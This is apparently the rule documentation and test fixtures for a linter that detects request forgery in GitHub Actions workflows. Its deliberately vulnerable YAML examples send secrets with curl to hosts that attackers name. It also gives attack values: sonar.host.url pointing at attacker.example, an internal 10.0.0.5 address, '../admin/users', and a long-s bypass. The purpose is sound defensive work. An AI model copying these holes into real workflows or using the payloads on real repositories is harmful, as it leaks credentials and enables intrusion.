## request-forgery

- problem: an attacker's value decides the host to which a command or an action sends a request. When the request carries a secret or the job's token, the attacker's server receives the secret or the token. When the job runs on a self-hosted runner, the request reaches services of the runner's network, with or without a credential
- expected: the workflow writes the host of every request, and any value an attacker controls appears only after the / that ends the host (https\://api.example.com/&lt;the value>)
- severity: critical (the worst of its kinds)
- targets: workflow, action-metadata
- facets:
  - weakness: request-forgery
  - attack-means: string
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- request-forgery.action-input
  - detected: {action} sends {secrets} to the server that its input {input} names, and the input {input} has the value of {expr_ref}, which an attacker controls on the events {controlled_on}
  - arguments:
    - {action}: The action, as owner/repo.
    - {secrets}: What the request carries: the names of the secrets as written, GITHUB_TOKEN for the job's token, \* for the whole secrets context, or enterprise-token for the token gh api reads from GH_ENTERPRISE_TOKEN or GITHUB_ENTERPRISE_TOKEN when no secret is known to be in that variable.
    - {input}: The input whose value decides where the action sends the credential.
    - {expr_ref}: The reference whose value decides the host, such as github.event.issue.title.
    - {controlled_on}: The events on which an attacker controls the value, each event named once.
  - consequence: the attacker writes the address of a server of the attacker's own into the value: in args of SonarSource's scanner, one more argument -Dsonar.host.url=&lt;the server>; in route or url of octokit/request-action, a full URL; the action sends the credential to that server, and the attacker uses the credential as the job would
  - remedy: keep a value an attacker controls out of the input: in args of SonarSource's scanner, pass only values written literally in the workflow file; in route or url of octokit/request-action, write the host in the workflow and put the attacker's value only in the path after the host, or in a parameter of the request
  - severity: critical (found from the CVSS metrics below by the table)
  - fact kinds: repo.wiki-open (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks, wiki-editor
  - preconditions: host-carries-credential, attacker-event, callers-events, wiki-open, app-status-check
  - true positives:
    - action-input.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/request-forgery-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   action-input (action-input.yml) of the rule, with on: workflow_call in
      #   place of the on of action-input.yml. The job passes its secrets with
      #   secrets: inherit. In the true positive, the test of CodeQL's
      #   actions/secret-exfiltration: on pull_request_target, the scan of
      #   SonarSource's action gets the pull request's title in args, with
      #   SONAR_TOKEN in env.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: the
      #   action splits args into the arguments of the scanner, so the title can
      #   add -Dsonar.host.url=, which the scanner reads after env and sends
      #   SONAR_TOKEN to.
      # attack: the author of a pull request from a fork titles the pull request x
      #   -Dsonar.host.url=https://attacker.example.
      # attack-run-behavior: the scanner takes https://attacker.example as the
      #   server and sends its requests there with Authorization: Bearer and the
      #   value of SONAR_TOKEN.
      on:
        pull_request_target:
      jobs:
        c:
          uses: example-org/request-forgery-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - action-input.yml (workflow, true-positive)
      ```yaml
      # situation: the test of CodeQL's actions/secret-exfiltration: on
      #   pull_request_target, the scan of SonarSource's action gets the pull
      #   request's title in args, with SONAR_TOKEN in env.
      # reason: the action splits args into the arguments of the scanner, so the
      #   title can add -Dsonar.host.url=, which the scanner reads after env and
      #   sends SONAR_TOKEN to.
      # attack: the author of a pull request from a fork titles the pull request x
      #   -Dsonar.host.url=https://attacker.example.
      # attack-run-behavior: the scanner takes https://attacker.example as the
      #   server and sends its requests there with Authorization: Bearer and the
      #   value of SONAR_TOKEN.
      name: test
      on:
        pull_request_target:
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: sonarsource/sonarcloud-github-action@master
              env:
                GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
                SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
              with:
                args: >
                  -Dsonar.scm.revision=${{ github.event.workflow_run.head_sha }}
                  -Dsonar.pullrequest.key=${{ github.event.pull_request.title }}
      ```
  - true negatives:
    - action-input.yml (workflow, true-negative)
      ```yaml
      # situation: on issues, octokit/request-action gets a route of GitHub's API
      #   with the issue's title in the query, and GITHUB_TOKEN.
      # reason: the route starts with a path, so the action sends the request to
      #   GitHub's API, and the title cannot change the host.
      # attack: the attacker opens an issue titled x repo:attacker/repo.
      # attack-run-behavior: the action sends the search to GitHub's API with the
      #   title in the query; the token goes to GitHub only.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - uses: octokit/request-action@v2.x
              with:
                route: GET /search/issues?q=${{ github.event.issue.title }}
              env:
                GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      ```
- request-forgery.credential-host
  - detected: {command} sends a request whose host the value of {expr_ref} decides, and an attacker controls the value on the events {controlled_on}; the request carries {secrets}
  - arguments:
    - {command}: The command that sends the request: curl, wget or gh api.
    - {expr_ref}: The reference whose value decides the host, such as github.event.issue.title.
    - {controlled_on}: The events on which an attacker controls the value, each event named once.
    - {secrets}: What the request carries: the names of the secrets as written, GITHUB_TOKEN for the job's token, \* for the whole secrets context, or enterprise-token for the token gh api reads from GH_ENTERPRISE_TOKEN or GITHUB_ENTERPRISE_TOKEN when no secret is known to be in that variable.
  - consequence: the attacker writes the host of a server of the attacker's own into the value; the command sends the request, with each secret the request carries, to that server, and the attacker uses each secret as the job would: reading what the secret gives access to, and, when the request carries the job's token (GITHUB_TOKEN) and the token can write, writing to the repository while the job runs
  - remedy: do not let a value an attacker controls decide the host of a request that carries a credential: write the host in the workflow and put the attacker's value only after the / that ends the host (https\://api.example.com/&lt;the value>). A check in the script that ends the step with an error when the value is not one of the hosts the workflow expects also stops the attack, but the linter does not read such a check and keeps reporting the request
  - severity: critical (found from the CVSS metrics below by the table)
  - fact kinds: repo.wiki-open (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks, wiki-editor
  - preconditions: host-carries-credential, attacker-event, callers-events, wiki-open, app-status-check
  - true positives:
    - credential-host.cross-step.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a step writes the secret DEPLOY_TOKEN to $GITHUB_ENV
      #   as TOKEN, and the next step sends a request with curl and TOKEN to the
      #   host the issue's title names.
      # reason: TOKEN, which the step before wrote to $GITHUB_ENV, has the secret,
      #   and the title of the issue decides the host the request goes to.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends the request with Authorization: Bearer and
      #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
      #   attacker logs the header.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - env:
                DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
              run: |
                echo "TOKEN=$DEPLOY_TOKEN" >> "$GITHUB_ENV"
            - run: |
                curl -fsS -H "Authorization: Bearer $TOKEN" "https://${{ github.event.issue.title }}/status"
      ```
    - credential-host.for-words.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a step sends a request with curl and the secret
      #   DEPLOY_TOKEN to the host the issue's title names, in a $( ) in the words
      #   of for.
      # reason: bash expands the words of for before the loop and runs the curl in
      #   $( ), so the request goes to the attacker's host with the secret.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends the request with Authorization: Bearer and
      #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
      #   attacker logs the header.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          env:
            DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
            TITLE: ${{ github.event.issue.title }}
          steps:
            - run: |
                for r in $(curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$TITLE/status"); do echo "$r"; done
      ```
    - credential-host.jump-path.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a step passes the issue's title in the environment
      #   variable HOST, defines a function f that returns when STOP is empty and
      #   sets HOST to a fixed host after the return, calls f, and sends a request
      #   with curl and the secret DEPLOY_TOKEN to HOST.
      # reason: STOP is not set in the step, so f
      #   returns before the assignment, HOST holds the title when curl runs, and
      #   the request with the token goes to the host that the title names.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends the request with the token to
      #   attacker.example, and the server of the attacker logs the token.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          env:
            DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          steps:
            - env:
                HOST: ${{ github.event.issue.title }}
              run: |
                f() { [ -z "$STOP" ] && return; HOST=api.example.com; }
                f
                curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$HOST/status"
      ```
    - credential-host.no-caller.action.yml (action-metadata, true-positive)
      ```yaml
      # situation: a composite action with no caller among the files that the
      #   linter reads; a step sends a request with curl to the host the title of an
      #   issue names, with the token of the job in an Authorization header.
      # reason: with no caller among the files that the linter reads, the rule
      #   reads the action on every event an attacker triggers, issues among the
      #   events. Anyone who can open an issue writes the title, so the attacker
      #   names a host of the attacker's own, and curl sends the header with the
      #   token to the host.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends GET /status to attacker.example with
      #   Authorization: Bearer and the GITHUB_TOKEN of the job, and the server of
      #   the attacker logs the header and can use the token while the job runs.
      name: status
      description: check the status of the host
      runs:
        using: composite
        steps:
          - env:
              DEPLOY_TOKEN: ${{ github.token }}
            run: |
              curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
            shell: bash
      ```
    - credential-host.runner-variable.yml (workflow, true-positive)
      ```yaml
      # situation: on pull_request_target, a step sends a request with curl and
      #   the secret DEPLOY_TOKEN to the host $GITHUB_HEAD_REF names, the name of
      #   the pull request's head branch.
      # reason: the author of a pull request from a fork names the branch, and a
      #   branch's name can be a host, so the request carries DEPLOY_TOKEN to the
      #   host of the attacker.
      # attack: the author of a pull request from a fork names the branch
      #   attacker.example.
      # attack-run-behavior: curl sends the request with Authorization: Bearer and
      #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
      #   attacker logs the header.
      on: pull_request_target
      jobs:
        j:
          runs-on: ubuntu-latest
          env:
            DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          steps:
            - run: |
                curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$GITHUB_HEAD_REF/status"
      ```
    - credential-host.shell-function.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a step defines a function that sends a request with
      #   curl to the host the issue's title names, with the function's argument
      #   in an Authorization header, and calls the function with the secret
      #   DEPLOY_TOKEN.
      # reason: the title of the issue decides the host of the request, and the
      #   request carries DEPLOY_TOKEN through the argument of the function.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends the request with Authorization: Bearer and
      #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
      #   attacker logs the header.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - env:
                DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
                HOST: ${{ github.event.issue.title }}
              run: |
                send() { curl -fsS -H "Authorization: Bearer $1" "https://$HOST/status"; }
                send "$DEPLOY_TOKEN"
      ```
    - credential-host.skipped-assignment.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a step passes the issue's title in the environment
      #   variable HOST, defines a function f that sets HOST to a fixed host only
      #   when Q is set, calls f, and sends a request with curl and the secret
      #   DEPLOY_TOKEN to HOST.
      # reason: Q is not set in the step, so f is not
      #   defined, the call fails, HOST holds the title when curl runs, and the
      #   request with the token goes to the host that the title names.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends the request with the token to
      #   attacker.example, and the server of the attacker logs the token.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          env:
            DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          steps:
            - env:
                HOST: ${{ github.event.issue.title }}
              run: |
                if [ -n "$Q" ]; then f() { HOST=api.example.com; }; fi
                f
                curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$HOST/status"
      ```
    - credential-host.status-commit.yml (workflow, true-positive)
      ```yaml
      # situation: on status, which an app outside GitHub Actions starts when the
      #   app writes a status for a commit, the job writes the message of the
      #   commit of the status (github.event.commit.commit.message) as the host of
      #   a request that carries a token.
      # reason: an outside CI that writes a status for a commit of a pull request
      #   from a fork starts a run of status on the default branch, with the
      #   message of that commit, which the author of the pull request writes, in
      #   the payload (seen on GitHub).
      # attack-value: github.event.commit.commit.message = "attacker.example"
      # attack-run-behavior: an outside CI writes a status for the commit of the
      #   pull request from a fork whose message is the value; the run of status
      #   starts on the default branch, and curl sends the token to the host
      #   attacker.example.
      on: status
      jobs:
        j:
          runs-on: ubuntu-latest
          env:
            DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          steps:
            - run: |
                curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.commit.commit.message }}/status"
      ```
    - credential-host.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a step sends a request with curl to the host the
      #   issue's title names, with the secret DEPLOY_TOKEN in an Authorization
      #   header.
      # reason: anyone who can open an issue writes the title, so the attacker
      #   names a host of the attacker's own, and curl sends the header with the
      #   secret to that host.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends GET /status to attacker.example with
      #   Authorization: Bearer and the value of DEPLOY_TOKEN, and the server of
      #   the attacker logs the header.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          env:
            DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          steps:
            - run: |
                curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
      ```
  - true negatives:
    - credential-host.subshell-assignment.yml (workflow, true-negative)
      ```yaml
      # situation: on issues opened, a step defines the function send, which
      #   sends the secret TOKEN to a host the issue's title names, inside
      #   ( ... ), and after the ( ... ) calls send.
      # reason: bash runs ( ... ) in a subshell, so after the subshell send is
      #   not defined, and the call of send sends nothing.
      # attack-value: github.event.issue.title = "attacker.example"
      # attack-run-behavior: the call of send fails with send: command not found,
      #   and curl does not run.
      on:
        issues:
          types: [opened]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                T: ${{ github.event.issue.title }}
                D: ${{ secrets.TOKEN }}
              run: |
                ( send() { curl -H "Authorization: Bearer $1" "https://$T/status"; } )
                send "$D"
      ```
    - credential-host.yml (workflow, true-negative)
      ```yaml
      # situation: on issues, a step sends a request with curl and the secret
      #   DEPLOY_TOKEN to api.example.com, with the issue's title in the query.
      # reason: the workflow writes the host, and the title is after the path, so
      #   the request goes to api.example.com whatever the title is.
      # attack: the attacker opens an issue titled attacker.example, the host of a
      #   server the attacker runs.
      # attack-run-behavior: curl sends the request to api.example.com with the
      #   title in the query; attacker.example gets nothing.
      on: issues
      jobs:
        j:
          runs-on: ubuntu-latest
          env:
            DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          steps:
            - run: |
                curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://api.example.com/search?q=${{ github.event.issue.title }}"
      ```
- request-forgery.runner-network
  - detected: {command} sends a request whose host the value of {expr_ref} decides, and an attacker controls the value on the events {controlled_on}; the job runs on a self-hosted runner ({runner_labels})
  - arguments:
    - {command}: What sends the request: the command curl, wget or gh api, or an action and the input of the action, such as octokit/request-action route.
    - {expr_ref}: The reference whose value decides the host, such as github.event.issue.title.
    - {controlled_on}: The events on which an attacker controls the value, each event named once.
    - {runner_labels}: The labels of the job's runs-on, as written.
  - consequence: the attacker writes the address of a service of the runner's network into the value, such as a service of an internal network or a cloud's metadata service; the request reaches that service from the runner, although the attacker cannot reach that service from outside, and the attacker can make the service act or, where the response comes back to the attacker, read the response
  - remedy: either write the host of the request in the workflow, so that a value an attacker controls does not decide the host, or run the job on a GitHub-hosted runner, which does not reach the network of the self-hosted runner, when the job does not need that network; either one alone removes the finding. A check in the script that ends the step with an error when the value is not one of the hosts the workflow expects also stops the attack, but the linter does not read such a check and keeps reporting the request
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: repo.wiki-open (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks, wiki-editor
  - preconditions: self-hosted-network, attacker-event, callers-events, wiki-open, app-status-check
  - true positives:
    - runner-network.yml (workflow, true-positive)
      ```yaml
      # situation: on issue_comment, a job on a runner labelled self-hosted and
      #   linux sends a request with curl to the host the comment's body names,
      #   without a credential.
      # reason: anyone who can comment writes the body, so the attacker names a
      #   host of the runner's network, and the request reaches that host from the
      #   runner.
      # attack: the attacker comments 10.0.0.5:8500/v1/agent/self#, the address of
      #   a service of the internal network.
      # attack-run-behavior: curl on the self-hosted runner sends GET to
      #   10.0.0.5:8500, a host the attacker does not reach from outside.
      on: issue_comment
      jobs:
        probe:
          runs-on: [self-hosted, linux]
          steps:
            - shell: bash
              run: |
                curl -fsS "http://${{ github.event.comment.body }}/healthz"
      ```
  - true negatives:
    - runner-network.yml (workflow, true-negative)
      ```yaml
      # situation: on issue_comment, a job on a self-hosted runner sends a request
      #   with curl to status.example.com, with the comment's body in the query.
      # reason: the workflow writes the host, so the request goes to
      #   status.example.com whatever the comment is.
      # attack: the attacker comments 10.0.0.5:8500.
      # attack-run-behavior: curl sends the request to status.example.com with the
      #   comment in the query; 10.0.0.5 gets nothing.
      on: issue_comment
      jobs:
        probe:
          runs-on: [self-hosted, linux]
          steps:
            - shell: bash
              run: |
                curl -fsS "https://status.example.com/check?name=${{ github.event.comment.body }}"
      ```

### undetected forms

- wiki-summary: the summary of a wiki page (github.event.pages&#91;\*].summary) in a job that runs on gollum: the rule reads the summary as a value that nobody writes. The gollum payloads that the authors of the linter saw had a null summary each time: for pages made and edited on the web interface of GitHub and pushed by git, an edit message on the web interface and a commit message of git did not go into the summary. The authors saw only pages that the owner of a public repository made and edited, and did not try an edit by an account with no role in the repository
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: limitation (decided by: run-time)
  - example: wiki-summary.yml (workflow, undetected)
    ```yaml
    # situation: on gollum, a step sends a request with a secret to the host
    #   that the summary of the wiki page names.
    # reason: a limitation (run time): GitHub decides the summary of a wiki page
    #   when the event happens. The gollum payloads that the authors of the
    #   linter saw had a null summary each time, for pages made and edited on
    #   the web interface and pushed by git; an edit by an account with no role
    #   in the repository was not tried.
    # cause: the rule reads the summary of a wiki page as a value that nobody
    #   writes.
    # attack-value: github.event.pages[0].summary = "attacker.example"
    # attack-run-behavior: if GitHub ever put a summary that the editor of the
    #   wiki writes in the payload, the summary would choose the host that gets
    #   the secret.
    on: gollum
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              SUMMARY: ${{ github.event.pages[0].summary }}
              DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
            run: |
              curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$SUMMARY/status"
    ```
- fork-review: a job on pull_request_review or pull_request_review_comment that runs only for a pull request from a fork, such as a job whose if: condition is github.event.pull_request.head.repo.full_name != github.repository: the run of a review that the attacker writes on the pull request of another person from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (repo.fork-pr-secrets, repo.fork-pr-write-tokens). The rule does not read the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens for the runs of a review, and does not count the run of a review of a pull request from a fork as a run of the attacker. When the attacker opened the pull request from a fork, a review of that pull request gives the attacker nothing more than the pull request itself gives: the run takes the workflow of the merge commit of the pull request (GitHub's documentation gives refs/pull/&lt;n>/merge as the ref of the run of a review), and the attacker can change that workflow in the pull request
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: fact)
  - example: fork-review.yml (workflow, undetected)
    ```yaml
    # situation: on comments on the diff, the comment's body is in the args of
    #   sonarcloud-github-action with GITHUB_TOKEN and SONAR_TOKEN in its env,
    #   in a job that runs only for a pull request from a fork.
    # reason: a todo (a fact): the job runs only for a pull request from a
    #   fork. Where a private repository gives secrets or a token that writes
    #   to the runs of pull requests from forks, the run of a review that the
    #   attacker writes on the pull request of another person from a fork has
    #   those secrets or that token, and the job runs for the attacker.
    # cause: the rule does not read the settings of a private repository for
    #   the runs of pull requests from forks, and does not count the run of a
    #   review of a pull request from a fork as a run of the attacker.
    # attack-value: github.event.comment.body = "x -Dsonar.host.url=https://attacker.example/PWNED"
    # attack-run-behavior: the comment of the attacker on the diff of the pull
    #   request of another person from a fork starts the job a; the scanner
    #   reads the value as a second option and sends SONAR_TOKEN to the host
    #   of the attacker.
    on: pull_request_review_comment
    jobs:
      a:
        if: github.event.pull_request.head.repo.full_name != github.repository
        runs-on: ubuntu-latest
        steps:
          - uses: sonarsource/sonarcloud-github-action@master
            env:
              GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
              SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
            with:
              args: -Dsonar.pullrequest.key=${{ github.event.comment.body }}
    ```
- if-compared: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('&#91;...]'), value)), where each string has only ASCII letters, digits, spaces, -, \_, . and /, does not start with -, and has no - right after a space. The if of the job limits the value in every step of the job, and the if of a step with a run: script limits the value in that step only. In those steps the value equals one of the strings when the case of the letters is ignored, so the rule does not report the value. The attacker still chooses the case of each letter of the value. GitHub's server, which evaluates the if of a job, also takes the Kelvin sign as equal to the letter k and the long s as equal to the letter s; the runner, which evaluates the if of a step, takes the Kelvin sign as equal to the letter k. Where the case of a letter changes what the value names, such as a command, a variable, a file on a file system that tells names apart by their case (the default file system of a Linux runner), a host or a tool, the choice of the case can cause harm
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: if-compared.yml (workflow, undetected)
    ```yaml
    # situation: on issue_comment, a job runs only when the comment's body is
    #   hosts.example.com, and a step sends the repository's token to the host
    #   that env.HOST, which holds the body, names.
    # reason: the job's if lets the body be only the string hosts.example.com,
    #   ignoring the case of its letters; GitHub's server, which evaluates the
    #   if of a job, also takes the long s as equal to s. The author of this
    #   example has not checked whether a host name with a long s names another
    #   host than the name with s, and where curl sends the request.
    # cause: the rule does not treat a value that the if of the job compares
    #   with such a string as written by the attacker.
    # attack-value: github.event.comment.body = "hoſts.example.com"
    # attack-run-behavior: GitHub's server takes the value as equal to
    #   hosts.example.com, so the job runs, and curl gets hoſts.example.com as
    #   the host.
    on:
      issue_comment:
        types: [created]
    jobs:
      j:
        if: github.event.comment.body == 'hosts.example.com'
        runs-on: ubuntu-latest
        steps:
          - env:
              HOST: ${{ github.event.comment.body }}
            run: |
              curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "https://$HOST/report"
    ```
- secret-input: a secret that a step of an action reads by inputs.&lt;name>, either because a caller among the files that the linter reads gives the secret under with:, or because the default of inputs.&lt;name> is \${{ github.token }}: the rule does not follow the value under with: into inputs.&lt;name> and does not read the default of inputs.&lt;name>; when no caller of the action is among the files that the linter reads, whether inputs.&lt;name> holds a secret is not known
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: repo-file)
  - example: called/action.yml (action-metadata, undetected)
    ```yaml
    # situation: the composite action sends a request with curl to the host the
    #   title of an issue names, with inputs.token in an Authorization header;
    #   ci.yml calls the action on issues and gives the secret DEPLOY_TOKEN as
    #   token.
    # reason: a todo (a file of the repository): anyone who can open an issue
    #   writes the title, so the attacker names a host of the attacker's own, and
    #   curl sends the header with the secret to the host.
    # cause: the rule does not follow the value under with: of the caller into
    #   inputs.token of the action, so the rule does not know that inputs.token
    #   holds a secret.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: curl sends GET /status to attacker.example with
    #   Authorization: Bearer and the value of DEPLOY_TOKEN, and the server of the
    #   attacker logs the header.
    name: status
    description: check the status of the host
    inputs:
      token:
        description: the token of the deploy
    runs:
      using: composite
      steps:
        - env:
            DEPLOY_TOKEN: ${{ inputs.token }}
          run: |
            curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
          shell: bash
    ```
    - .github/workflows/ci.yml (workflow)
      ```yaml
      on: issues
      jobs:
        status:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
            - uses: ./called
              with:
                token: ${{ secrets.DEPLOY_TOKEN }}
      ```
- caller-runner: a request from a step of an action, where the runs-on of the job of the caller decides the runner: the rule reads runs-on only in a workflow, an action file has no runs-on, and the rule does not read the runs-on of the job of the caller, so a self-hosted runner of the caller is not seen
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: repo-file)
  - example: called/action.yml (action-metadata, undetected)
    ```yaml
    # situation: the composite action sends a request with curl, without a
    #   credential, to the host the body of a comment names; ci.yml calls the
    #   action on issue_comment in a job on a runner labelled self-hosted and
    #   linux.
    # reason: a todo (a file of the repository): anyone who can comment writes
    #   the body, so the attacker names a host of the network of the runner,
    #   and the request reaches the host from the runner.
    # cause: the rule reads runs-on only of the job of the step, and an action
    #   has no runs-on; the runs-on of the job of the caller decides the
    #   runner.
    # attack: the attacker comments 10.0.0.5:8500/v1/agent/self#, the address
    #   of a service of the internal network.
    # attack-run-behavior: curl on the self-hosted runner sends GET to
    #   10.0.0.5:8500, a host the attacker does not reach from outside.
    name: probe
    description: probe the host
    runs:
      using: composite
      steps:
        - run: |
            curl -fsS "http://${{ github.event.comment.body }}/healthz"
          shell: bash
    ```
    - .github/workflows/ci.yml (workflow)
      ```yaml
      on: issue_comment
      jobs:
        probe:
          runs-on: [self-hosted, linux]
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
            - uses: ./called
      ```
- other-command: a request sent by a command other than curl, wget and gh api: httpie, nc, dig, a script of python or node
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: other-command.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step sends a request with httpie to the host the
    #   issue's title names, with the secret DEPLOY_TOKEN in a header.
    # reason: a todo (the same file): httpie sends the header to the attacker's
    #   host as curl does.
    # cause: the rule reads the requests of curl, wget and gh api only.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: httpie sends the request with the Authorization
    #   header and the value of DEPLOY_TOKEN to attacker.example.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        steps:
          - run: |
              http --ignore-stdin GET "https://${{ github.event.issue.title }}/status" "Authorization:Bearer $DEPLOY_TOKEN"
    ```
- graphql-variables: baseUrl in the variables of octokit/graphql-action, which becomes an option of the request when an attacker's value writes the key
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: graphql-variables.yml (workflow, undetected)
    ```yaml
    # situation: on issues, octokit/graphql-action gets the issue's body as
    #   variables, with GITHUB_TOKEN.
    # reason: a todo (the same file): the body can write the key baseUrl, which
    #   becomes an option of the request, so the token goes to the host the body
    #   names.
    # cause: the rule reads route and url of octokit/request-action, and no
    #   input of octokit/graphql-action.
    # attack: the attacker opens an issue whose body is {"baseUrl":
    #   "https://attacker.example"}.
    # attack-run-behavior: the action sends the query with the token to
    #   attacker.example.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: octokit/graphql-action@v2.x
            with:
              query: query { viewer { login } }
              variables: ${{ github.event.issue.body }}
            env:
              GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    ```
- path-only: an attacker's value only in the path, the query or the fragment of a request whose host the workflow writes, including a full URL to GitHub's API as the endpoint of gh api: what the attacker gains with the credential on the same host depends on the method and the endpoint, which are not checked
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: fact)
  - example: path-only.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step sends a request with curl and the secret
    #   DEPLOY_TOKEN to api.example.com, with the issue's title in the path.
    # reason: a todo (a fact): the title can name another endpoint of the same
    #   host, and what the secret does there depends on the endpoints of
    #   api.example.com.
    # cause: the rule reports a value that decides the host only.
    # attack: the attacker opens an issue titled ../admin/users, a path of
    #   another endpoint of api.example.com.
    # attack-run-behavior: curl sends the request with the secret to that other
    #   endpoint of api.example.com.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        steps:
          - run: |
              curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://api.example.com/v1/${{ github.event.issue.title }}"
    ```
- attacker-header: a request without a credential from a GitHub-hosted runner, whose header an attacker's value also writes: the metadata service of the runner's cloud answers a request with the header Metadata: true, which was not tried
